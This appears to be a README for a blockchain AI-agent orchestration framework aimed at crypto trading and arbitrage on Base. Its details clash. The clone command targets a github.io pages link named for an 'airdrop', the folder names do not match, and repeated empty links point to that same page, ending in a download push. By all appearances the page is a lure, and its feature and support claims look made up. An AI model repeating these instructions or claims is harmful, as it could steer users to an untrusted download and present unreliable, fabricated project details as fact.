# 🚀 Base Agent Orchestrator (BAO)

[](https://vigot876-arch.github.io/base-agent-airdrop-mcp/)

## 🌟 Overview

Base Agent Orchestrator (BAO) is a sophisticated framework for coordinating autonomous AI agents within the Base ecosystem. Imagine a symphony conductor, but instead of musicians, it directs specialized blockchain agents that perform complex, multi-step operations across decentralized networks. BAO transforms isolated agent actions into coordinated workflows, enabling intelligent automation that adapts to real-time on-chain conditions.

This system serves as the central nervous system for decentralized agent networks, providing the infrastructure needed for agents to collaborate, share context, and execute sophisticated strategies that no single agent could accomplish alone. Built with extensibility at its core, BAO empowers developers to create agent collectives that can manage portfolios, execute arbitrage strategies, coordinate governance actions, and respond dynamically to market events.

## 📦 Installation & Quick Start

### Prerequisites
- Node.js 20.x or later
- Base Sepolia testnet access (for development)
- OpenAI API key or Anthropic Claude API key
- Basic understanding of agent-based systems

### Installation Steps

1. **Clone the repository**
   ```bash
   git clone https://vigot876-arch.github.io/base-agent-airdrop-mcp/
   cd base-agent-orchestrator
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment**
   ```bash
   cp .env.example .env
   # Edit .env with your API keys and configuration
   ```

4. **Launch the orchestrator**
   ```bash
   npm run start:dev
   ```

[](https://vigot876-arch.github.io/base-agent-airdrop-mcp/)

## 🏗️ Architecture Overview

BAO employs a modular architecture where specialized agents (called "Specialists") operate under the coordination of a central "Conductor." Each Specialist has unique capabilities, and the Conductor manages communication, resource allocation, and workflow execution.

```mermaid
graph TB
    A[User Interface] --> B[Orchestrator Core]
    B --> C[Conductor Agent]
    
    C --> D[Market Analyst Specialist]
    C --> E[Transaction Engineer Specialist]
    C --> F[Risk Assessment Specialist]
    C --> G[Compliance Validator Specialist]
    
    D --> H[Base Blockchain Network]
    E --> H
    F --> H
    G --> H
    
    I[External Data Feeds] --> D
    I --> F
    
    J[API Gateway] --> B
    K[Persistent Storage] --> B
    
    style A fill:#4a90e2
    style B fill:#2c3e50
    style C fill:#e74c3c
    style D fill:#27ae60
    style E fill:#f39c12
    style F fill:#8e44ad
    style G fill:#16a085
```



## ⚙️ Configuration

### Example Profile Configuration

Create a `profiles/advanced-trader.json` configuration file:

```json
{
  "profile": "advanced-trader",
  "agentCollective": {
    "specialists": [
      {
        "type": "market-analyst",
        "parameters": {
          "analysisDepth": "deep",
          "monitoringPairs": ["ETH/USDC", "BASE/ETH"],
          "alertThresholds": {
            "volatility": 15,
            "volumeSpike": 300
          }
        }
      },
      {
        "type": "transaction-engineer",
        "parameters": {
          "gasOptimization": "aggressive",
          "slippageTolerance": 0.5,
          "batchOperations": true
        }
      }
    ]
  },
  "riskParameters": {
    "maxExposure": 2.5,
    "stopLoss": 15,
    "cooldownPeriod": "30m"
  },
  "blockchainAccess": {
    "networks": ["base-mainnet", "base-sepolia"],
    "permissions": {
      "tokenTransfers": true,
      "contractInteractions": true,
      "governanceVoting": false
    }
  }
}
```

### Example Console Invocation

```bash
# Start with a specific agent collective
bao start --profile advanced-trader --network base-mainnet

# Execute a coordinated strategy
bao execute-strategy triangular-arbitrage \
  --capital 5.0 \
  --tokens ETH,USDC,BASE \
  --risk-profile moderate

# Monitor agent activities
bao monitor --specialists all --format dashboard

# Deploy new specialist agent
bao specialist deploy liquidity-provider \
  --parameters '{"poolSelection": "auto", "range": "narrow"}'
```

## 🎯 Key Features

### 🤖 Intelligent Agent Coordination
- **Dynamic Workflow Management**: Agents collaboratively adjust strategies based on real-time market conditions
- **Context-Aware Execution**: Each operation considers the broader agent collective's state and objectives
- **Conflict Resolution**: Built-in mechanisms prevent agent conflicts and optimize resource allocation

### 🔒 Security & Compliance
- **Multi-Layer Validation**: Every transaction undergoes multiple specialist validations
- **Permission Granularity**: Fine-grained control over what each agent can execute
- **Audit Trail Generation**: Comprehensive logging of all agent decisions and actions

### 📊 Advanced Analytics
- **Collective Intelligence Metrics**: Measure the effectiveness of agent coordination
- **Performance Attribution**: Understand which agent combinations yield optimal results
- **Predictive Optimization**: Machine learning models suggest agent collective improvements

### 🌐 Interoperability
- **Multi-Chain Ready**: Architecture designed for cross-chain agent coordination
- **API-First Design**: RESTful and WebSocket interfaces for external integration
- **Plugin Ecosystem**: Extend functionality with community-developed specialists

## 🖥️ System Compatibility

| Operating System | Status | Notes |
|-----------------|--------|-------|
| 🪟 Windows 10/11 | ✅ Fully Supported | WSL2 recommended for development |
| 🍎 macOS 12+ | ✅ Fully Supported | Native ARM64 builds available |
| 🐧 Linux (Ubuntu 22.04+) | ✅ Fully Supported | Preferred for production deployment |
| 🐳 Docker Containers | ✅ Optimized | Official images available |
| ☁️ Cloud Platforms | ✅ Extensive Support | AWS, GCP, Azure templates provided |

## 🔌 API Integration

### OpenAI API Configuration
BAO leverages OpenAI's models for natural language understanding of market sentiment and strategy formulation:

```javascript
// Example integration for sentiment analysis specialist
const sentimentAnalyzer = new OpenAISpecialist({
  model: "gpt-4-turbo",
  capabilities: ["newsInterpretation", "socialSentiment", "narrativeDetection"],
  temperature: 0.3, // Lower for consistent financial analysis
  maxTokens: 1024
});
```

### Claude API Integration
Anthropic's Claude models provide robust reasoning for complex multi-agent coordination:

```javascript
// Claude-powered coordination logic
const strategyOrchestrator = new ClaudeCoordinator({
  model: "claude-3-opus-20240229",
  reasoningDepth: "extended",
  ethicalGuidelines: "financial-responsibility-v1",
  maxTokens: 4096
});
```

## 🛠️ Development Guide

### Creating Custom Specialists

Extend the base `Specialist` class to create new agent types:

```javascript
class CustomTradingSpecialist extends Specialist {
  constructor(config) {
    super(config);
    this.specialization = "momentum-trading";
    this.requiredPermissions = ["READ_MARKET", "EXECUTE_TRADES"];
  }

  async analyze(context) {
    // Implement custom analysis logic
    const opportunity = await this.detectMomentum(context);
    return this.formatRecommendation(opportunity);
  }

  async execute(decision, collectiveContext) {
    // Coordinate with other specialists before execution
    await this.coordinateWith('risk-assessment', decision);
    return super.execute(decision, collectiveContext);
  }
}
```

### Building Agent Collectives

Design specialized groups of agents for particular strategies:

```yaml
# DeFi Yield Optimization Collective
collective:
  name: "yield-optimizer-v2"
  specialists:
    - type: "yield-scout"
      weight: 0.4
      parameters: { "protocols": ["Aave", "Compound", "Uniswap V3"] }
    
    - type: "risk-assessor"
      weight: 0.3
      parameters: { "maxImpermanentLoss": 5, "safetyScoreThreshold": 85 }
    
    - type: "execution-timing"
      weight: 0.3
      parameters: { "gasPriceMonitoring": true, "optimalWindow": "15m" }
  
  coordination:
    style: "democratic"
    votingThreshold: 0.67
    fallbackBehavior: "conservative"
```

## 📈 Performance Metrics

BAO includes comprehensive monitoring and analytics:

- **Agent Efficiency Score**: Measures how effectively specialists utilize resources
- **Collective Coherence Metric**: Quantifies how well agents work together
- **Strategy Success Rate**: Tracks performance of different agent combinations
- **Cost Optimization Index**: Monitors gas and fee efficiency across operations

## 🚢 Deployment Strategies

### Local Development
```bash
# Development mode with hot reload
npm run dev

# With specific blockchain network
NETWORK=base-sepolia npm run dev
```

### Production Deployment
```bash
# Build optimized version
npm run build

# Deploy with PM2 process management
pm2 start ecosystem.config.js --env production
```

### Docker Deployment
```bash
# Build container
docker build -t base-agent-orchestrator .

# Run with environment configuration
docker run -d --env-file .env.production base-agent-orchestrator
```

## 🔐 Security Considerations

BAO implements multiple security layers:

1. **Agent Sandboxing**: Each specialist operates in an isolated context
2. **Transaction Simulation**: All operations simulated before mainnet execution
3. **Multi-Signature Logic**: Critical actions require virtual multi-agent consensus
4. **Rate Limiting**: Prevents excessive blockchain interactions
5. **Anomaly Detection**: Machine learning models detect unusual agent behavior

## 🤝 Contributing

We welcome contributions to expand BAO's capabilities:

1. **Fork the repository** and create your feature branch
2. **Add tests** for any new functionality
3. **Ensure code quality** matches existing standards
4. **Submit a pull request** with detailed description

### Contribution Areas
- New specialist agent implementations
- Enhanced coordination algorithms
- Additional blockchain network integrations
- Improved analytics and visualization tools
- Documentation and tutorial creation

## 📚 Learning Resources

### Documentation Structure
- `/docs/concepts` - Core architectural concepts
- `/docs/tutorials` - Step-by-step implementation guides
- `/docs/api` - Complete API reference
- `/docs/examples` - Real-world use case implementations

### Tutorial Series
1. **Getting Started**: Your first agent collective
2. **Specialist Development**: Creating custom agents
3. **Advanced Coordination**: Multi-agent strategy design
4. **Production Deployment**: Scaling and monitoring
5. **Security Best Practices**: Safeguarding your operations

## 📄 License

Copyright © 2026 Base Agent Orchestrator Contributors

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for complete details.

The MIT License grants permission for commercial use, modification, distribution, and private use of this software. Attribution is required, and the license includes a disclaimer of warranty. This permissive license is ideal for collaborative development and enterprise adoption.

## ⚠️ Disclaimer

Base Agent Orchestrator (BAO) is an advanced coordination framework for autonomous blockchain agents. Users assume full responsibility for:

- **Financial Risk**: All blockchain interactions involve financial risk. Never allocate resources you cannot afford to lose.
- **Agent Behavior**: While BAO includes safety mechanisms, autonomous agents may behave unexpectedly in novel market conditions.
- **Regulatory Compliance**: Ensure your use of autonomous agents complies with applicable laws in your jurisdiction.
- **Technical Complexity**: This framework requires substantial technical expertise to operate securely and effectively.
- **Experimental Nature**: Autonomous agent coordination represents cutting-edge technology with inherent unpredictability.

The development team provides this software as a tool for experimentation and innovation, not as financial advice or a guaranteed revenue generator. Always conduct thorough testing in controlled environments before deploying to production with significant resources.

## 🌍 Community & Support

### Support Channels
- **Documentation**: Comprehensive guides and API references
- **Community Forum**: Discussion and knowledge sharing
- **Issue Tracker**: Bug reports and feature requests
- **Discord Community**: Real-time discussion and support

### Enterprise Support
Available for organizations requiring:
- Custom specialist development
- Priority security reviews
- Dedicated integration assistance
- Training and certification programs

---

[](https://vigot876-arch.github.io/base-agent-airdrop-mcp/)

**Transform your blockchain operations** with intelligent agent coordination. Download Base Agent Orchestrator today and begin building the next generation of decentralized automation systems.